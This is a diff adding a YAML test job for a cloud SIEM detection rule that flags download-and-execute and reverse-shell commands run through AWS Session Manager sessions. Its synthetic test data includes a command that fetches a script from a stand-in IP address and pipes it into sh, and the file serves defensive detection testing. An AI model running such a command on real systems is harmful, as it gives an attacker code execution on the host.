@@ -1,0 +1,39 @@
+type: job
+name: AWS CloudTrail Suspicious Command Execution via SSM Session
+detection:
+  source: ngsiem_template
+  name: "AWS - CloudTrail - Suspicious Command Execution via SSM Session"
+  id: 0451b81f-d42f-4f85-89c4-d38edb6b012c
+description: |
+  A Session Manager session runs a download-and-execute command line on an
+  instance. The rule inspects the command of successful StartSession calls
+  for download tools, inline interpreters, output piped into a shell and
+  reverse-shell patterns, since an interactive command session gives code
+  execution on the host without SSH.
+
+mitre:
+  tactics: [execution]
+  techniques: [T1651, T1059.004, T1105]
+
+state:
+  account_id: "111111111111"
+  aws_region: us-east-1
+  source_ip:  gen.ipv4()
+  actor_name: gen.username()
+  actor:      gen.aws_identity(type=IAMUser, userName=ref.actor_name, accountId=ref.account_id)
+  user_agent: "aws-sdk-go-v2/1.36.5 ua/2.1 os/linux lang/go#1.24.4 md/GOOS#linux md/GOARCH#amd64 api/ssm#1.60.0 tracemill/1.0"
+  command:    "curl -s http://203.0.113.47/install.sh | sh"
+
+workloads:
+  - scenario: scenarios/aws/ssm/start-session-interactive-command
+    bindings:
+      account_id: ref.account_id
+      aws_region: ref.aws_region
+      source_ip:  ref.source_ip
+      actor_name: ref.actor_name
+      actor:      ref.actor
+      user_agent: ref.user_agent
+      command:    ref.command
+    expectation:
+      summary: "StartSession -- interactive command downloads a script and pipes it into sh"
+      expected: alert
